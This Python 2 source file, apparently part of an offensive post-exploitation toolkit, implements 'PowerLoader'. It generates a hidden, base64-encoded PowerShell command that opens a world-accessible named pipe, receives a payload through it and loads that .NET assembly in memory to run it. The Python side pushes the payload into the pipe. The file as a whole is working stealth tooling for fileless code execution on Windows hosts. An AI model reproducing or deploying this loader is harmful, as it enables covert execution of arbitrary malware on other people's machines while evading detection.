# -*- encoding: utf-8 -*-

import random
import string
import base64
import threading

from ctypes import WinDLL, get_last_error
from ctypes.wintypes import BOOL, LPSTR, DWORD
from time import sleep

from hashlib import md5

kernel32 = WinDLL('kernel32', use_last_error=True)

WaitNamedPipe = kernel32.WaitNamedPipeA
WaitNamedPipe.restype = BOOL
WaitNamedPipe.argtypes = (
    LPSTR, DWORD
)

PIPE_LOADER_TEMPLATE = '''
$ps=new-object System.IO.Pipes.PipeSecurity;
$all=New-Object System.Security.Principal.SecurityIdentifier("S-1-1-0");
$acl=new-object System.IO.Pipes.PipeAccessRule($all,"FullControl","Allow");
$ps.AddAccessRule($acl);
$p=new-object System.IO.Pipes.NamedPipeServerStream("{pipename}","In",2,"Byte",0,{size},0,$ps);
$p.WaitForConnection();
$x=new-object System.IO.BinaryReader($p);
$a=$x.ReadBytes({size});
$x.Close();
[Reflection.Assembly]::Load($a).GetTypes()[0].GetMethods()[0].Invoke($null,@());
'''

PIPE_LOADER_CMD_TEMPLATE = '{powershell} -w hidden -EncodedCommand {cmd}'
POWERSHELL_PATH = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'

def generate_loader_cmd(size):
    pipename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in xrange(10))
    encoded = base64.b64encode(PIPE_LOADER_TEMPLATE.strip().format(
        pipename=pipename, size=size).encode('utf-16le'))
    cmd = PIPE_LOADER_CMD_TEMPLATE.format(powershell=POWERSHELL_PATH, cmd=encoded)
    return cmd, pipename

def push_payload(payload, timeout=90, log_cb=None):
    size = len(payload)
    cmd, pipename = generate_loader_cmd(size)

    def _sender():
        if log_cb:
            log_cb(None, 'Thread started (pipe={}, payload={}, md5={})'.format(
                pipename, size, md5(payload).hexdigest()))

        pipe = None
        failed = False

        try:
            pipepath = '\\\\.\\pipe\\' + pipename

            found = False
            for i in xrange(timeout):
                found = WaitNamedPipe(pipepath, 1000)
                if found:
                    break

                sleep(1)

            if not found:
                if log_cb:
                    log_cb(False, 'WaitNamedPipe - Timeout ({}, pipe={}, gle={})'.format(
                        timeout, pipepath, get_last_error()))

            pipe = open(pipepath, 'ab')
            if log_cb:
                log_cb(None, 'Open - OK')

            pipe.write(payload)

            if log_cb:
                log_cb(None, 'Push - OK')

        except Exception, e:
            if log_cb:
                log_cb(False, 'Open/Push - Fail ({})'.format(e))

            failed = True

        finally:
            try:
                if pipe:
                    pipe.close()

                    if not failed and log_cb:
                        log_cb(True, 'FLUSH - OK')

            except Exception, e:
                if not failed and log_cb:
                    log_cb(False, 'FLUSH - Fail ({})'.format(e))

    worker = threading.Thread(
        target=_sender,
        name='PowerLoader (pipe={}, timeout={})'.format(
            pipename, timeout)
    )
    worker.daemon = True
    worker.start()

    if not worker.is_alive():
        raise ValueError('PowerLoader thread is dead')

    return cmd, pipename
